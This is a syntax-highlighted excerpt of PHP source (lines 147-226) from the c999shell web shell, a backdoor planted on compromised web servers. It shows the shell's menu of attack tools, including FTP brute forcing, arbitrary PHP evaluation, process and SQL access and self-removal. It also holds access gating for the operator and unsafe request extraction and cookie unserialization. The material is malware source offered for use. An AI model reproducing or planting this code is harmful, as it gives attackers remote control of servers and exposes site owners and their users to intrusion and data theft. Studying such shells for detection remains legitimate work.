<span class="lineno"> 147</span> <span class="nv">$copy_unset</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="c1">//Remove copied files from buffer after pasting</span>
<span class="lineno"> 148</span> <span class="c1">//Quick launch</span>
<span class="lineno"> 149</span> <span class="nv">$quicklaunch</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 150</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Home\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">home\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="p">),</span>
<span class="lineno"> 151</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Back\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">back\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.back(1)&quot;</span><span class="p">),</span>
<span class="lineno"> 152</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Forward\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">forward\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.go(1)&quot;</span><span class="p">),</span>
<span class="lineno"> 153</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">UPDIR\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">up\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=%upd&amp;sort=%sort&quot;</span><span class="p">),</span>
<span class="lineno"> 154</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Refresh\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">refresh\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">17</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
<span class="lineno"> 155</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Search\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">search\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=search&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 156</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Buffer\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">buffer\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=fsbuff&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 157</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Encoder&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=encoder&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 158</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Tools&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=tools&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 159</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Proc.&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 160</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;FTP brute&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ftpquickbrute&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 161</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Sec.&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=security&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 162</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;SQL&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 163</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;PHP-code&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=eval&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 164</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Update&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=update&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 165</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Feedback&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=feedback&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 166</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Self remove&lt;/b&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=selfremove&quot;</span><span class="p">),</span>
<span class="lineno"> 167</span>  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Logout&lt;/b&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">if (confirm(&#39;Are you sure?&#39;)) window.close()&quot;</span><span class="p">)</span>
<span class="lineno"> 168</span> <span class="p">);</span>
<span class="lineno"> 169</span> <span class="c1">//Highlight-code colors</span>
<span class="lineno"> 170</span> <span class="nv">$highlight_background</span> <span class="o">=</span> <span class="s2">&quot;#c0c0c0&quot;</span><span class="p">;</span>
<span class="lineno"> 171</span> <span class="nv">$highlight_bg</span> <span class="o">=</span> <span class="s2">&quot;#FFFFFF&quot;</span><span class="p">;</span>
<span class="lineno"> 172</span> <span class="nv">$highlight_comment</span> <span class="o">=</span> <span class="s2">&quot;#6A6A6A&quot;</span><span class="p">;</span>
<span class="lineno"> 173</span> <span class="nv">$highlight_default</span> <span class="o">=</span> <span class="s2">&quot;#0000BB&quot;</span><span class="p">;</span>
<span class="lineno"> 174</span> <span class="nv">$highlight_html</span> <span class="o">=</span> <span class="s2">&quot;#1300FF&quot;</span><span class="p">;</span>
<span class="lineno"> 175</span> <span class="nv">$highlight_keyword</span> <span class="o">=</span> <span class="s2">&quot;#007700&quot;</span><span class="p">;</span>
<span class="lineno"> 176</span> <span class="nv">$highlight_string</span> <span class="o">=</span> <span class="s2">&quot;#000000&quot;</span><span class="p">;</span>
<span class="lineno"> 177</span> <span class="o">@</span><span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;f&quot;</span><span class="p">];</span>
<span class="lineno"> 178</span> <span class="o">@</span><span class="nb">extract</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;c999shcook&quot;</span><span class="p">]);</span>
<span class="lineno"> 179</span> <span class="c1">//END CONFIGURATION</span>
<span class="lineno"> 180</span> <span class="c1">// \/Next code isn&#39;t for editing\/</span>
<span class="lineno"> 181</span> <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno"> 182</span> <span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 183</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$host_allow</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$tmp</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">*&quot;</span><span class="p">,</span><span class="s2">&quot;.*&quot;</span><span class="p">,</span><span class="nb">preg_quote</span><span class="p">(</span><span class="nv">$v</span><span class="p">));}</span>
<span class="lineno"> 184</span> <span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;!^(&quot;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)$!i&quot;</span><span class="p">;</span>
<span class="lineno"> 185</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))</span> <span class="k">and</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">gethostbyaddr</span><span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))))</span> <span class="p">{</span><span class="k">exit</span><span class="p">(</span><span class="s2">&quot;&lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">http</span><span class="o">://</span><span class="nx">ccteam</span><span class="o">.</span><span class="nx">ru</span><span class="o">/</span><span class="nx">releases</span><span class="o">/</span><span class="nx">cc999shell\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&gt;c999shell&lt;/a&gt;: Access Denied - your host (&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) not allow&quot;</span><span class="p">);}</span>
<span class="lineno"> 186</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$login</span><span class="p">))</span>
<span class="lineno"> 187</span> <span class="p">{</span>
<span class="lineno"> 188</span>  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$md5_pass</span><span class="p">))</span> <span class="p">{</span><span class="nv">$md5_pass</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);}</span>
<span class="lineno"> 189</span>  <span class="k">if</span> <span class="p">((</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_USER&quot;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$login</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_PW&quot;</span><span class="p">])</span> <span class="o">!=</span> <span class="nv">$md5_pass</span><span class="p">))</span>
<span class="lineno"> 190</span>  <span class="p">{</span>
<span class="lineno"> 191</span>   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$login_txt</span><span class="p">))</span> <span class="p">{</span><span class="nv">$login_txt</span> <span class="o">=</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;|</span>
<span class="lineno"> 192</span> <span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$donated_html</span><span class="p">));}</span>
<span class="lineno"> 193</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;WWW-Authenticate: Basic realm=</span><span class="se">\&quot;</span><span class="s2">c999shell &quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;: &quot;</span><span class="o">.</span><span class="nv">$login_txt</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 194</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;HTTP/1.0 401 Unauthorized&quot;</span><span class="p">);</span>
<span class="lineno"> 195</span>   <span class="k">exit</span><span class="p">(</span><span class="nv">$accessdeniedmess</span><span class="p">);</span>
<span class="lineno"> 196</span>  <span class="p">}</span>
<span class="lineno"> 197</span> <span class="p">}</span>
<span class="lineno"> 198</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">!=</span> <span class="s2">&quot;img&quot;</span><span class="p">)</span>
<span class="lineno"> 199</span> <span class="p">{</span>
<span class="lineno"> 200</span> <span class="nv">$lastdir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
<span class="lineno"> 201</span> <span class="nb">chdir</span><span class="p">(</span><span class="nv">$curdir</span><span class="p">);</span>
<span class="lineno"> 202</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$selfwrite</span> <span class="k">or</span> <span class="nv">$updatenow</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nx">c999sh_getupdate</span><span class="p">(</span><span class="nv">$selfwrite</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span> <span class="k">exit</span><span class="p">;}</span>
<span class="lineno"> 203</span> <span class="nv">$sess_data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;</span><span class="si">$sess_cookie</span><span class="s2">&quot;</span><span class="p">]);</span>
<span class="lineno"> 204</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sess_data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="lineno"> 205</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="lineno"> 206</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="lineno"> 207</span> <span class="nv">$disablefunc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">);</span>
<span class="lineno"> 208</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$disablefunc</span><span class="p">))</span>
<span class="lineno"> 209</span> <span class="p">{</span>
<span class="lineno"> 210</span>  <span class="nv">$disablefunc</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">);</span>
<span class="lineno"> 211</span>  <span class="nv">$disablefunc</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">);</span>
<span class="lineno"> 212</span> <span class="p">}</span>
<span class="lineno"> 213</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c999_buff_prepare&quot;</span><span class="p">))</span>
<span class="lineno"> 214</span> <span class="p">{</span>
<span class="lineno"> 215</span> <span class="k">function</span> <span class="nf">c999_buff_prepare</span><span class="p">()</span>
<span class="lineno"> 216</span> <span class="p">{</span>
<span class="lineno"> 217</span>  <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">;</span>
<span class="lineno"> 218</span>  <span class="k">global</span> <span class="nv">$act</span><span class="p">;</span>
<span class="lineno"> 219</span>  <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));}</span>
<span class="lineno"> 220</span>  <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));}</span>
<span class="lineno"> 221</span>  <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
<span class="lineno"> 222</span>  <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
<span class="lineno"> 223</span>  <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
<span class="lineno"> 224</span>  <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
<span class="lineno"> 225</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">!=</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}}}</span>
<span class="lineno"> 226</span>  <span class="k">else</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}}}</span>
